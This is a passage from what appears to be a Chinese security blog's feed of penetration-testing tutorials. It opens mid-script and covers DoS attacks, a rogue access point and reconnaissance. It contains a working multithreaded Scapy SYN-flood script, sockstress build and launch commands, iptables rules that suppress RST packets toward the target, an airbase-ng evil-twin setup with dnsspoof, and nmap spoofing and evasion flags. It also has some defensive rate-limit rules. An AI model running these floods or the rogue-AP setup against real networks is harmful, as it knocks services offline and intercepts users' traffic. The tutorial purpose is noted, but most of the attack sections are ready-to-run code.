RST -d '</span>+target+<span class="string">' -j DROP'</span>)</span><br><span class="line">signal.signal(signal.SIGINT,shutdown)</span><br><span class="line"></span><br><span class="line"><span class="comment">#多线程攻击</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n攻击正在进行...按 Ctrl+C 停止攻击"</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>,threads):</span><br><span class="line">thread.start_new_thread(sockstress,(target,dstport))</span><br><span class="line"></span><br><span class="line"><span class="comment">#永远执行攻击</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">0</span>==<span class="number">0</span>:</span><br><span class="line">sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h4 id="C-攻击脚本"><a href="#C-攻击脚本" class="headerlink" title="C 攻击脚本:"></a><strong>C 攻击脚本:</strong></h4><pre><code>git clone https://github.com/defuse/sockstress.gitcd sockstressgcc -Wall -c sockstress.c        #gcc编译源码gcc -pthread -o sockstress sockstress.o        #对生成的sockstress.o编译为可执行程序./sockstress 1.1.1.1:21 eth0 -d 100            #-d 参数修改默认delay延迟时间./sockstress 1.1.1.1:80 eth0 -d 10 -p payloads/http</code></pre><p><strong>防火墙规则禁止本机回RST包</strong></p><pre><code>iptables -A OUTPUT -p TCP --tcp-flags rst rst -d 1.1.1.1 -j DROP</code></pre><p><strong>查看攻击效果</strong></p><ul><li>执行攻击后,被攻击端查看TCP建立连接的统计<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">natstat -pantu | grep ESTAB | wc -l</span><br><span class="line">free</span><br><span class="line">top</span><br></pre></td></tr></table></figure></li></ul><h4 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a><strong>防御措施</strong></h4><ul><li>直到今天sockstress攻击仍然是一种很有效的DoS攻击方式</li><li>由于建立完整的TCP三步握手,因此使用syn cookie防御无效</li><li>根本的防御方法是采用白名单(不实际)</li><li>折中对策:限制单位时间内每IP建的TCP连接数<br>  封杀每30秒与80端口建立连接超过10个的IP地址<br>  <code>iptables -I INPUT -p tcp --dport 80 -m state --state NEW -m recent --set</code><br>  <code>iptables -I INPUT -p tcp --dport 80 -m state --state NEW -m recent --update --seconds 30 --hitcount 10 -j DROP</code><br>  以上规则对DDoS攻击无效</li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 拒绝服务 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 拒绝服务攻击 </tag>
            
            <tag> scapy </tag>
            
            <tag> C </tag>
            
            <tag> DoS攻击 </tag>
            
            <tag> Smurf </tag>
            
            <tag> sockstress </tag>
            
            <tag> TCP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Syn-Flood拒绝服务攻击原理及IP地址欺骗</title>
      <link href="/2013/10/23/DoS/Syn-Flood%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86%E5%8F%8AIP%E5%9C%B0%E5%9D%80%E6%AC%BA%E9%AA%97/"/>
      <url>/2013/10/23/DoS/Syn-Flood%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86%E5%8F%8AIP%E5%9C%B0%E5%9D%80%E6%AC%BA%E9%AA%97/</url>
      
        <content type="html"><![CDATA[<blockquote><h3 id="Syn-Flood"><a href="#Syn-Flood" class="headerlink" title="Syn Flood"></a><strong>Syn Flood</strong></h3></blockquote><p>常伴随IP欺骗</p><ul><li>真正的攻击目标</li></ul><p><strong>Scapy</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">scapy</span><br><span class="line">i&#x3D;IP()</span><br><span class="line">i.dst&#x3D;1.1.1.1</span><br><span class="line">i.display()</span><br><span class="line">t&#x3D;TCP()</span><br><span class="line">sr1(i&#x2F;t,verbose&#x3D;1,timeout&#x3D;3)</span><br><span class="line">sr1(IP(dst&#x3D;1.1.1.1)&#x2F;TCP())</span><br></pre></td></tr></table></figure><h5 id="Python攻击脚本-Syn-flood-py"><a href="#Python攻击脚本-Syn-flood-py" class="headerlink" title="Python攻击脚本: Syn_flood.py"></a><strong>Python攻击脚本:</strong> <code>Syn_flood.py</code></h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># .*. coding: utf-8 .*.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> thread</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.getLogger(<span class="string">"scapy.runtime"</span>).setLevel(logging.ERROR)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) != <span class="number">4</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"用法: ./Syn_flood.py [IP] [端口] [线程数]"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"举例: ./Syn_flood.py 1.1.1.1 80 20"</span></span><br><span class="line">sys.exit()</span><br><span class="line"></span><br><span class="line">target=str(sys.argv[<span class="number">1</span>])</span><br><span class="line">prot=int(sys.argv[<span class="number">2</span>])</span><br><span class="line">threads=int(sys.argv[<span class="number">3</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"正在执行 Syn Flood 攻击,按 Ctrl+C 停止攻击."</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">synflood</span><span class="params">(target,port)</span>:</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">0</span>==<span class="number">0</span>:</span><br><span class="line">x=random.randint(<span class="number">0</span>,<span class="number">65535</span>)</span><br><span class="line">send(IP(dst=target)/TCP(dport=port,sport=x),verbose=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>,threads):</span><br><span class="line">thread.start_new_thread(synflood,(target,port))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">0</span>==<span class="number">0</span>:</span><br><span class="line">sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><strong>防火墙规则设置</strong></p><pre><code>iptables -A OUTPUT -p tcp --tcp-flags RST RST -d 1.1.1.1 -j DROP    #对攻击目标拒绝回RST包netstat -n | awk &apos;/^tcp/ {++S[$NF]} END {for(a in S) print a, S[a]}&apos;    #查看TCP连接状态数据统计</code></pre><ul><li>Windows系统默认半连接数10个</li></ul><h4 id="TCP所有连接状态"><a href="#TCP所有连接状态" class="headerlink" title="TCP所有连接状态"></a><strong>TCP所有连接状态</strong></h4><table><thead><tr><th align="center">LISTEN</th><th align="center">S 服务器端口处于侦听状态,等待连接请求</th></tr></thead><tbody><tr><td align="center">SYN-SENT</td><td align="center">C 发起连接请求,等待对端口相应</td></tr><tr><td align="center">SYN-RECV</td><td align="center">S 已收到连接请求</td></tr><tr><td align="center">ESTABLISHED</td><td align="center">C/S三次握手成功,TCP连接已建立</td></tr><tr><td align="center">FIN-WAIT-1</td><td align="center">C/S等待对端相应中断请求确认,或对端中断请求</td></tr><tr><td align="center">FIN-WAIT-2</td><td align="center">C/S等待对端发送中断请求</td></tr><tr><td align="center">CLOSE-WAIT</td><td align="center">C/S等待本地 进程/用户 关闭连接</td></tr><tr><td align="center">CLOSING</td><td align="center">C/S等待对端响应连接中断确认</td></tr><tr><td align="center">LAST-ACK</td><td align="center">C/S等待对端响应之前的连接中断确认</td></tr><tr><td align="center">TIME-WAIT</td><td align="center">C/S等待足够时间长度确保对端收到连接中断确认(最大4分钟)</td></tr><tr><td align="center">CLOSED</td><td align="center">C/S无任何连接状态</td></tr></tbody></table><h4 id="IP地址欺骗"><a href="#IP地址欺骗" class="headerlink" title="IP地址欺骗"></a><strong>IP地址欺骗</strong></h4><ul><li><p>经常用于DoS攻击</p></li><li><p>根据IP头地址寻址<br>  伪造IP源地址</p></li><li><p>边界路由器过滤<br>  入站,出站</p></li><li><p>受害者可能是源,目的地址</p></li><li><p>绕过基于地址的验证</p></li><li><p>压力测试模拟多用户</p></li><li><p>上层协议(TCP序列号)</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 拒绝服务 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 拒绝服务攻击 </tag>
            
            <tag> scapy </tag>
            
            <tag> DoS攻击 </tag>
            
            <tag> TCP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DoS拒绝服务攻击介绍及分类</title>
      <link href="/2013/10/21/DoS/DoS%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB%E4%BB%8B%E7%BB%8D%E5%8F%8A%E5%88%86%E7%B1%BB/"/>
      <url>/2013/10/21/DoS/DoS%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB%E4%BB%8B%E7%BB%8D%E5%8F%8A%E5%88%86%E7%B1%BB/</url>
      
        <content type="html"><![CDATA[<blockquote><h3 id="拒绝服务"><a href="#拒绝服务" class="headerlink" title="拒绝服务"></a><strong>拒绝服务</strong></h3></blockquote><p><strong>DoS不是DOS</strong></p><ul><li>利用程序漏洞或一对一资源耗尽的Denial of Service 拒绝服务</li></ul><p><strong>DDoS分布式拒绝服务</strong></p><ul><li>一对一的攻击完全拼各自的资源,效果差</li><li>多对一的攻击汇聚资源能力,重点在于量大,属于资源耗尽型</li></ul><p><strong>历史</strong></p><ul><li>以前:欠缺技术能力的无赖,我ping死你(最难缠的无赖)</li><li>现在:最强大最危险的攻击,攻击方式众多(专业化的要求勒索)</li><li>例如:电商网站被勒索,Bill gates僵尸程序</li><li>贩卖和租用肉鸡已经在为黑产中重要的一部分</li><li>最终的办法就是拼资源,投资抗D,或者乖乖交保护费</li></ul><h4 id="Anonymous匿名者"><a href="#Anonymous匿名者" class="headerlink" title="Anonymous匿名者"></a><strong>Anonymous匿名者</strong></h4><ul><li>世界最著名的黑客组织</li><li>组织结构宽松,人员来自世界各地</li><li>以DDoS攻击著称的无政府主义者</li><li>亦正亦邪,攻击恐怖组织也攻击政府宗教机构</li><li>近些年来涉足政治斗争</li><li>成员露面时均带有Guy Fawkes面具</li><li>最早的核心成员来自4chan图片社区</li><li>惯常雇佣外围黑客成员发动DDoS攻击</li></ul><p><strong>口号</strong><br>We are Anonymous, We are a Legion,<br>We do not forgive, We do not forget,<br>Expect us.</p><h4 id="DoS分类"><a href="#DoS分类" class="headerlink" title="DoS分类"></a><strong>DoS分类</strong></h4><p><strong>LAND攻击</strong></p><ul><li>这种攻击方式与SYN floods类似,不过在LAND攻击包中的原地址和目标地址都是攻击对象的IP.这种攻击会导致被攻击的机器死循环,最终耗尽资源而死机.</li></ul><p><strong>CC攻击</strong>    (Distributed HTTP flood，分布式HTTP洪水攻击)</p><ul><li>CC攻击是DDoS攻击的一种类型,使用代理服务器向受害服务器发送大量貌似合法的请求(通常使用HTTP GET).CC(Challenge Collapsar，挑战黑洞)根据其工具命名,攻击者创造性地使用代理机制,利用众多广泛可用的免费代理服务器发动DDoS攻击.许多免费代理服务器支持匿名模式,这使追踪变得非常困难.</li></ul><p><strong>僵尸网络攻击</strong></p><ul><li>僵尸网络是指大量被命令与控制(C&amp;C)服务器所控制的互联网主机群.攻击者传播恶意软件并组成自己的僵尸网络.僵尸网络难于检测的原因是,僵尸主机只有在执行特定指令时才会与服务器进行通讯,使得它们隐蔽且不易察觉.僵尸网络根据网络通讯协议的不同分为IRC,HTTP或P2P类等.</li></ul><p><strong>应用程序级洪水攻击</strong> (Application level floods)</p><ul><li>与前面叙说的攻击方式不同,应用程序级洪水攻击主要是针对应用软件层的,也就是高于OSI的.它同样是以大量消耗系统资源为目的,通过向IIS这样的网络服务程序提出无节制的资源申请来迫害正常的网络服务.</li></ul><h5 id="D网络"><a href="#D网络" class="headerlink" title="D网络"></a><strong>D网络</strong></h5><ul><li>基于巨量的Flood耗尽目标网络带宽资源</li><li>ICMP Flood, UDP Flood</li></ul><h5 id="D协议"><a href="#D协议" class="headerlink" title="D协议"></a><strong>D协议</strong></h5><ul><li>攻击协议漏洞发起的拒绝服务攻击</li><li>如Syn Flood, Ping of Death, ARP, DNS, 802.11, SSL</li></ul><h5 id="D应用和系统"><a href="#D应用和系统" class="headerlink" title="D应用和系统"></a><strong>D应用和系统</strong></h5><ul><li>针对应用软件和操作系统漏洞发起的拒绝服务攻击</li><li>大量频繁访问消耗系统资源严重的应用(CC)</li><li>通常表现为操作系统运行正常,网络流量不大,但服务停止相应</li><li>可以是一击毙命的,也可以是耗尽目标资源的</li></ul><p><em>以上分类并不严谨,不必太过执着于此</em></p><h4 id="为何会被DoS"><a href="#为何会被DoS" class="headerlink" title="为何会被DoS"></a><strong>为何会被DoS</strong></h4><p><strong>从攻击者到被害者</strong></p><ul><li>网络–&gt;FW–&gt;服务器OS–&gt;服务器应用</li></ul><p><strong>资源耗尽</strong></p><ul><li>网络:带宽</li><li>FW: 吞吐量,并发连接</li><li>服务器: CPU,内存,硬盘I/O</li><li>应用: 处理请求能力,对OS资源的使用权</li></ul><p><strong>程序漏洞攻击</strong></p><ul><li>缓冲区溢出</li><li>协议,程序逻辑漏洞</li></ul><p><strong>链路上任何一点都可能成为目标</strong></p><h4 id="通过3个指标分析拒绝服务攻击"><a href="#通过3个指标分析拒绝服务攻击" class="headerlink" title="通过3个指标分析拒绝服务攻击"></a><strong>通过3个指标分析拒绝服务攻击</strong></h4><p><strong>源</strong></p><ul><li>单一</li><li>众多</li></ul><p><strong>攻击手段类型</strong></p><ul><li>资源消耗型</li><li>漏洞利用型</li></ul><p><strong>攻击目标</strong></p><ul><li><p>资源消耗型:<br>  带宽上限<br>  设备性能上限<br>  协议性能上限<br>  应用性能上限<br>  系统性能上限</p></li><li><p>漏洞利用型:<br>  崩溃系统<br>  崩溃程序</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 拒绝服务 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 拒绝服务攻击 </tag>
            
            <tag> DoS攻击 </tag>
            
            <tag> DDoS攻击 </tag>
            
            <tag> CC </tag>
            
            <tag> 缓冲区溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用airbase-ng手动伪造AP并作DNS欺骗攻击及流氓AP工具</title>
      <link href="/2013/06/12/Wireless_Attacks/%E5%88%A9%E7%94%A8airbase-ng%E6%89%8B%E5%8A%A8%E4%BC%AA%E9%80%A0AP%E5%B9%B6%E4%BD%9CDNS%E6%AC%BA%E9%AA%97%E6%94%BB%E5%87%BB%E5%8F%8A%E6%B5%81%E6%B0%93AP%E5%B7%A5%E5%85%B7/"/>
      <url>/2013/06/12/Wireless_Attacks/%E5%88%A9%E7%94%A8airbase-ng%E6%89%8B%E5%8A%A8%E4%BC%AA%E9%80%A0AP%E5%B9%B6%E4%BD%9CDNS%E6%AC%BA%E9%AA%97%E6%94%BB%E5%87%BB%E5%8F%8A%E6%B5%81%E6%B0%93AP%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<ul><li>EVIL TWIN AP / ROGUE AP(邪恶双胞胎/流氓AP)    </li><li>真正意义上的黑客攻击行为</li></ul><h4 id="利用airbase-ng手动伪造AP并作DNS欺骗攻击"><a href="#利用airbase-ng手动伪造AP并作DNS欺骗攻击" class="headerlink" title="利用airbase-ng手动伪造AP并作DNS欺骗攻击"></a><strong>利用airbase-ng手动伪造AP并作DNS欺骗攻击</strong></h4><p>蹭网与被蹭网<br>北上广20%的公共场所无线网络是伪造的</p><pre><code>airodump-ng wlan2mon    #查看附近AP情况airbase-ng -a &lt;AP MAC&gt; --essid kifi-free -c 11 wlan2mon        #伪造一个名为kifi-free的APairodump-ng wlan2mon    #再次查看附近AP情况apt-get install bridge-utils    #安装网卡桥接工具包brctl addbr Bridge        #添加网桥,命名为Bridgebrctl addif Bridge eth0        #把能上网的eth0网卡添加连接到网桥Bridgedhclient eth0            #dhcp重新分配IP地址brctl addif Bridge at0    #把伪造AP网卡添加连接到网桥,使其能上网ifconfig eth0 0.0.0.0 up    #抹除网桥成员的IP地址,并启动ifconfig at0 0.0.0.0 up        #除网桥成员的IP地址,并启动ifconfig bridge 192.168.1.10 up        #把之前的IP地址分配给网桥并启动route add -net 0.0.0.0 netmask 0.0.0.0 gw 192.168.1.1    #增加缺省路由,网关指向真实APecho 1 &gt; /proc/sys/net/ipv4/ip_forward        #修改配置启动IP转发,其实就是路由功能dnspoof -i bridge -f dnsspoof.hosts            #配置完成后执行DNS欺骗    /usr/share/dsniff/dnsspool.hosts        #dns文件配置apachet2ctl start                            #启动Apache网站服务</code></pre><h4 id="EVIL-TWIN-AP-ROGUE-AP-邪恶双胞胎-流氓AP"><a href="#EVIL-TWIN-AP-ROGUE-AP-邪恶双胞胎-流氓AP" class="headerlink" title="*EVIL TWIN AP / ROGUE AP(邪恶双胞胎/流氓AP)    *"></a>*<em>EVIL TWIN AP / ROGUE AP(邪恶双胞胎/流氓AP)    *</em></h4><ul><li>3vilTwinAttacker    #现已更名为WiFi-Pumpkin  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;P0cL4bs&#x2F;WiFi-Pumpkin.git</span><br><span class="line">cd WiFi-Pumpkin</span><br><span class="line">chmod +x installer.sh</span><br><span class="line">.&#x2F;installer.sh --install</span><br><span class="line"></span><br><span class="line">iptables</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 无线渗透 </category>
          
          <category> 无线攻击 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> aircrack-ng </tag>
            
            <tag> 流氓AP </tag>
            
            <tag> 伪造AP </tag>
            
            <tag> DNS欺骗 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WAF扫描识别及负载均衡识别</title>
      <link href="/2013/03/23/Information_Gethering/WAF%E6%89%AB%E6%8F%8F%E8%AF%86%E5%88%AB%E5%8F%8A%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%AF%86%E5%88%AB/"/>
      <url>/2013/03/23/Information_Gethering/WAF%E6%89%AB%E6%8F%8F%E8%AF%86%E5%88%AB%E5%8F%8A%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E8%AF%86%E5%88%AB/</url>
      
        <content type="html"><![CDATA[<blockquote><h3 id="防火墙识别"><a href="#防火墙识别" class="headerlink" title="防火墙识别"></a><strong>防火墙识别</strong></h3><p>通过检查回包,可能识别端口是否经过防火墙过滤<br>设备多种多样,结果存在一定误差</p></blockquote><table><thead><tr><th align="center">No.</th><th align="center">Send</th><th align="center">Response</th><th align="left">Type</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">syn</td><td align="center">No</td><td align="left">Filtered</td></tr><tr><td align="center">1</td><td align="center">ack</td><td align="center">rst</td><td align="left">Filtered</td></tr><tr><td align="center">2</td><td align="center">syn</td><td align="center">syn+ack/syn+rst</td><td align="left">Filtered</td></tr><tr><td align="center">2</td><td align="center">ack</td><td align="center">No</td><td align="left">Filtered</td></tr><tr><td align="center">3</td><td align="center">syn</td><td align="center">syn+ack/syn+rst</td><td align="left">Unfiltered/Open</td></tr><tr><td align="center">3</td><td align="center">ack</td><td align="center">rst</td><td align="left">Unfiltered/Open</td></tr><tr><td align="center">4</td><td align="center">syn</td><td align="center">No</td><td align="left">Closed</td></tr><tr><td align="center">4</td><td align="center">ack</td><td align="center">No</td><td align="left">Closed</td></tr></tbody></table><h4 id="python–scapy-firewall-detect-py-1-1-1-1-443"><a href="#python–scapy-firewall-detect-py-1-1-1-1-443" class="headerlink" title="python–scapy ./firewall_detect.py 1.1.1.1 443"></a><strong>python–scapy</strong> <code>./firewall_detect.py 1.1.1.1 443</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.getLogger(<span class="string">"scapy.runtime"</span>).setLevel(logging.ERROR)</span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv)!=<span class="number">3</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Usage - ./firewall_detect.py [Target IP] [Target Port]"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Example - ./firewall_detect.py 1.1.1.1 443"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Example will determine if filtering exists on port 443 of host 10.0.0.5"</span></span><br><span class="line">sys.exit()</span><br><span class="line"></span><br><span class="line">ip=sys.argv[<span class="number">1</span>]</span><br><span class="line">port=int(sys.argv[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">ACK_response=sr1(IP(dst=ip)/TCP(dport=port,flags=<span class="string">'A'</span>),timeout=<span class="number">1</span>,verbose=<span class="number">0</span>)</span><br><span class="line">SYN_response=sr1(IP(dst=ip)/TCP(dport=port,flags=<span class="string">"S"</span>),timeout=<span class="number">1</span>,verbose=<span class="number">0</span>)</span><br><span class="line"><span class="keyword">if</span> (ACK_response==<span class="literal">None</span>) <span class="keyword">and</span> (SYN_response==<span class="literal">None</span>):</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Port is either unstatefully filtered or host is down"</span></span><br><span class="line"><span class="keyword">elif</span> ((ACK_response==<span class="literal">None</span>) <span class="keyword">or</span> (SYN_response==<span class="literal">None</span>)) <span class="keyword">and</span> <span class="keyword">not</span> ((ACK_response==<span class="literal">None</span>) <span class="keyword">and</span> (SYN_response==<span class="literal">None</span>)):</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Stateful filtering in place"</span></span><br><span class="line"><span class="keyword">elif</span> int(SYN_response[TCP].flags)==<span class="number">18</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Port is unfiltered and open"</span></span><br><span class="line"><span class="keyword">elif</span> int(SYN_response[TCP].flags)==<span class="number">20</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Port is unfiltered and closed"</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Unable to determine if the port is filtered"</span></span><br></pre></td></tr></table></figure><h4 id="Nmap有系列防火墙过滤检测功能"><a href="#Nmap有系列防火墙过滤检测功能" class="headerlink" title="Nmap有系列防火墙过滤检测功能"></a><strong>Nmap</strong>有系列防火墙过滤检测功能</h4><pre><code>nmap -sA 192.168.254.254 -p 22</code></pre><blockquote><h4 id="负载均衡识别"><a href="#负载均衡识别" class="headerlink" title="负载均衡识别"></a><strong>负载均衡识别</strong></h4><p>广域网负载均衡<br>    DNS轮询<br>    一个域名解析多个A纪录<br>    智能DNS<br>服务器负载均衡<br>HTTP-Loadbalancing<br>    Nginx<br>    Apache</p></blockquote><h4 id="lbd"><a href="#lbd" class="headerlink" title="lbd"></a><strong>lbd</strong></h4><pre><code>lbd www.baidu.comlbd mail.163.com</code></pre><blockquote><h3 id="WAF识别"><a href="#WAF识别" class="headerlink" title="WAF识别"></a><strong>WAF识别</strong></h3></blockquote><h4 id="wafw00f-web应用防火墙识别"><a href="#wafw00f-web应用防火墙识别" class="headerlink" title="wafw00f web应用防火墙识别"></a><strong>wafw00f</strong> web应用防火墙识别</h4><pre><code>wafw00f -lwafw00f http://google.com</code></pre><h3 id="nmap-web应用防火墙识别"><a href="#nmap-web应用防火墙识别" class="headerlink" title="nmap web应用防火墙识别"></a><strong>nmap</strong> web应用防火墙识别</h3><pre><code>nmap google.com --script=http-waf-detect.nse</code></pre><h4 id="nmap所有参数-man-nmap"><a href="#nmap所有参数-man-nmap" class="headerlink" title="nmap所有参数 man nmap"></a><strong>nmap所有参数 man nmap</strong></h4><pre><code>-iL filename                   从文件中读取待检测的目标,文件中的表示方法支持机名,ip,网段-iR hostnum                    随机选取,进行扫描.如果-iR指定为0,则是无休止的扫描--exclude host1[, host2]      从扫描任务中需要排除的主机--exculdefile exclude_file     排除文件中的IP,格式和-iL指定扫描文件的格式相同</code></pre><p><strong>主机发现</strong></p><pre><code>-sL                     仅仅是显示,扫描的IP数目,不会进行任何扫描-sn                     ping扫描,即主机发现-Pn                     不检测主机存活-PS/PA/PU/PY[portlist]  TCP SYN Ping/TCP ACK Ping/UDP Ping发现-PE/PP/PM               使用ICMP echo, timestamp and netmask 请求包发现主机-PO[prococol list]      使用IP协议包探测对方主机是否开启-n/-R                   不对IP进行域名反向解析/为所有的IP都进行域名的反响解析--dns-servers 8.8.8.8     根据DNS服务地址扫描--system-dns            使用系统在DNS扫描--traceroute            路由追踪</code></pre><p><strong>扫描技巧</strong></p><pre><code>-sS/sT/sA/sW/sM                 TCP SYN/TCP connect()/ACK/TCP窗口扫描/TCP Maimon扫描-sU                             UDP扫描-sN/sF/sX                       TCP Null，FIN，and Xmas扫描--scanflags                     自定义TCP包中的flags-sI zombie host[:probeport]     Idlescan-sY/sZ                          SCTP INIT/COOKIE-ECHO 扫描-sO                             使用IP protocol 扫描确定目标机支持的协议类型-b “FTP relay host”             使用FTP bounce scan</code></pre><p><strong>指定端口和扫描顺序</strong></p><pre><code>-p                      特定的端口 -p80,443 或者 -p1-65535-p U:PORT               扫描udp的某个端口, -p U:53-F                      快速扫描模式,比默认的扫描端口还少-r                      不随机扫描端口,默认是随机扫描的--top-ports &quot;number&quot;    扫描开放概率最高的number个端口,出现的概率需要参考nmap-services文件,ubuntu中该文件位于/usr/share/nmap.nmap默认扫前1000个--port-ratio &quot;ratio&quot;    扫描指定频率以上的端口</code></pre><p><strong>服务版本识别</strong></p><pre><code>-sV                             开放版本探测,可以直接使用-A同时打开操作系统探测和版本探测--version-intensity &quot;level&quot;     设置版本扫描强度,强度水平说明了应该使用哪些探测报文。数值越高，服务越有可能被正确识别。默认是7--version-light                 打开轻量级模式,为--version-intensity 2的别名--version-all                   尝试所有探测,为--version-intensity 9的别名--version-trace                 显示出详细的版本侦测过程信息</code></pre><p><strong>脚本扫描</strong></p><pre><code>-sC　　根据端口识别的服务,调用默认脚本--script=”Lua scripts”　　调用的脚本名--script-args=n1=v1,[n2=v2]　　调用的脚本传递的参数--script-args-file=filename　　使用文本传递参数--script-trace　　显示所有发送和接收到的数据--script-updatedb　　更新脚本的数据库--script-help=”Lua script”　　显示指定脚本的帮助</code></pre><p><strong>OS识别</strong></p><pre><code>-O              启用操作系统检测,-A来同时启用操作系统检测和版本检测--osscan-limit 　　 针对指定的目标进行操作系统检测(至少需确知该主机分别有一个open和closed的端口)--osscan-guess  　　推测操作系统检测结果,当Nmap无法确定所检测的操作系统时，会尽可能地提供最相近的匹配，Nmap默认进行这种匹配</code></pre><p><strong>防火墙/IDS躲避和哄骗</strong></p><pre><code>-f; --mtu value                 指定使用分片、指定数据包的MTU.-D decoy1,decoy2,ME             使用诱饵隐蔽扫描-S IP-ADDRESS                   源地址欺骗-e interface                    使用指定的接口-g/ --source-port PROTNUM       使用指定源端口--proxies url1,[url2],...       使用HTTP或者SOCKS4的代理--data-length NUM               填充随机数据让数据包长度达到NUM--ip-options OPTIONS            使用指定的IP选项来发送数据包--ttl VALUE                     设置IP time-to-live域--spoof-mac ADDR/PREFIX/VEBDOR  MAC地址伪装--badsum                        使用错误的checksum来发送数据包</code></pre><p><strong>Nmap 输出</strong></p><pre><code>-oN                     将标准输出直接写入指定的文件-oX                     输出xml文件-oS                     将所有的输出都改为大写-oG                     输出便于通过bash或者perl处理的格式,非xml-oA BASENAME            